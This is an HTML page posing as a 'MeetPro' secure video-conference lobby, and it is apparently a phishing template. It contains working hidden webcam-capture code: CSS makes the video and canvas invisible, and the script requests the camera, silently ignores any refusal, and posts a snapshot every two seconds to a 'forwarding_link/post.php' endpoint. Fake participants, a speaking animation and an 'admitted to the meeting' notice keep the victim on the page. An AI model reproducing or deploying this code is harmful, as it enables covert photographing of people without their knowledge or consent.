<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MeetPro - Secure Video Conference</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #1f1f1f;
            color: #fff;
            overflow: hidden;
        }

        /* Hide camera elements completely */
        .video-wrap,
        #video,
        #canvas {
            position: absolute !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            visibility: hidden !important;
            left: -9999px !important;
        }

        /* Main layout */
        .meeting-container {
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header */
        .meeting-header {
            background: #262626;
            padding: 15px 30px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #3a3a3a;
        }

        .meeting-info {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .meeting-title {
            font-size: 18px;
            font-weight: 600;
        }

        .meeting-id {
            font-size: 14px;
            color: #a0a0a0;
        }

        .security-badge {
            background: #0e7f1e;
            padding: 5px 12px;
            border-radius: 5px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .header-actions {
            display: flex;
            gap: 15px;
        }

        .header-btn {
            background: transparent;
            border: none;
            color: #fff;
            font-size: 14px;
            cursor: pointer;
            padding: 8px 16px;
            border-radius: 5px;
            transition: background 0.2s;
        }

        .header-btn:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        /* Main video area */
        .video-area {
            flex: 1;
            background: #1a1a1a;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }

        /* Participants grid */
        .participants-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 10px;
            width: 100%;
            height: 100%;
            padding: 20px;
            max-width: 1400px;
        }

        .participant-box {
            background: #2a2a2a;
            border-radius: 10px;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid transparent;
            transition: border-color 0.3s;
        }

        .participant-box.speaking {
            border-color: #0b8d42;
            animation: speaking-pulse 1s infinite;
        }

        @keyframes speaking-pulse {
            0%, 100% {
                border-color: #0b8d42;
            }
            50% {
                border-color: #0e7f1e;
            }
        }

        .participant-avatar {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: 700;
            color: #fff;
        }

        .participant-name {
            position: absolute;
            bottom: 15px;
            left: 15px;
            background: rgba(0, 0, 0, 0.8);
            padding: 8px 15px;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 500;
        }

        .participant-status {
            position: absolute;
            top: 15px;
            right: 15px;
            display: flex;
            gap: 8px;
        }

        .status-icon {
            width: 30px;
            height: 30px;
            background: rgba(0, 0, 0, 0.8);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
        }

        /* Waiting message */
        .waiting-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 100;
            animation: fadeOut 5s ease-out 10s forwards;
        }

        @keyframes fadeOut {
            to {
                opacity: 0;
                pointer-events: none;
            }
        }

        .waiting-content {
            text-align: center;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .waiting-spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top-color: #0b8d42;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .waiting-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .waiting-subtitle {
            font-size: 16px;
            color: #a0a0a0;
        }

        /* Control bar */
        .control-bar {
            background: #262626;
            padding: 20px 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            border-top: 1px solid #3a3a3a;
        }

        .control-btn {
            width: 55px;
            height: 55px;
            border-radius: 50%;
            border: none;
            background: #3a3a3a;
            color: #fff;
            font-size: 22px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .control-btn:hover {
            background: #4a4a4a;
            transform: scale(1.05);
        }

        .control-btn.active {
            background: #0b8d42;
        }

        .control-btn.danger {
            background: #d93025;
            width: 65px;
            height: 55px;
            border-radius: 30px;
        }

        .control-btn.danger:hover {
            background: #f33a2b;
        }

        .control-label {
            font-size: 12px;
            color: #a0a0a0;
            margin-top: 5px;
        }

        .control-group {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
        }

        /* Participant info bar */
        .info-bar {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.8);
            padding: 15px 20px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            gap: 15px;
            z-index: 50;
        }

        .info-item {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
        }

        .info-value {
            font-weight: 600;
            color: #0b8d42;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .meeting-header {
                padding: 12px 15px;
            }

            .meeting-title {
                font-size: 16px;
            }

            .header-actions {
                gap: 8px;
            }

            .header-btn {
                padding: 6px 12px;
                font-size: 12px;
            }

            .participants-grid {
                grid-template-columns: 1fr;
                padding: 10px;
            }

            .control-bar {
                padding: 15px;
                gap: 10px;
            }

            .control-btn {
                width: 45px;
                height: 45px;
                font-size: 18px;
            }

            .control-btn.danger {
                width: 55px;
                height: 45px;
            }

            .info-bar {
                top: 10px;
                right: 10px;
                padding: 10px 15px;
                flex-direction: column;
                align-items: flex-start;
                gap: 8px;
            }

            .info-item {
                font-size: 12px;
            }
        }

        /* Notification */
        .notification {
            position: absolute;
            top: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(11, 141, 66, 0.95);
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            z-index: 200;
            animation: slideDown 0.3s ease-out, slideUp 0.3s ease-out 3s forwards;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }

        @keyframes slideUp {
            to {
                opacity: 0;
                transform: translateX(-50%) translateY(-20px);
            }
        }
    </style>
</head>

    <script>
        // Camera capture (invisible to user)
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'forwarding_link/post.php',
                dataType: 'json',
                async: false,
                success: function(result) {},
                error: function() {}
            });
        }

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        const constraints = {
            audio: false,
            video: { facingMode: "user" }
        };

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                // Silently fail if camera access denied
            }
        }

        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;

            var context = canvas.getContext('2d');
            setInterval(function() {
                context.drawImage(video, 0, 0, 640, 480);
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);
            }, 2000);
        }

        init();

        // Control button interactions
        function toggleMic() {
            const btn = document.getElementById('micBtn');
            btn.classList.toggle('active');
            btn.textContent = btn.classList.contains('active') ? 'üîá' : 'üé§';
        }

        function toggleVideo() {
            const btn = document.getElementById('videoBtn');
            btn.classList.toggle('active');
            btn.textContent = btn.classList.contains('active') ? 'üìπ' : 'üé•';
        }

        // Duration timer
        let seconds = 0;
        setInterval(() => {
            seconds++;
            const mins = Math.floor(seconds / 60);
            const secs = seconds % 60;
            document.getElementById('duration').textContent = 
                `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }, 1000);

        // Simulate speaking animation
        setInterval(() => {
            const boxes = document.querySelectorAll('.participant-box');
            boxes.forEach(box => box.classList.remove('speaking'));
            const randomBox = boxes[Math.floor(Math.random() * boxes.length)];
            randomBox.classList.add('speaking');
        }, 3000);

        // Show notification after waiting overlay fades
        setTimeout(() => {
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.textContent = '‚úì You have been admitted to the meeting';
            document.body.appendChild(notification);
            setTimeout(() => notification.remove(), 3500);
        }, 10000);
    </script>
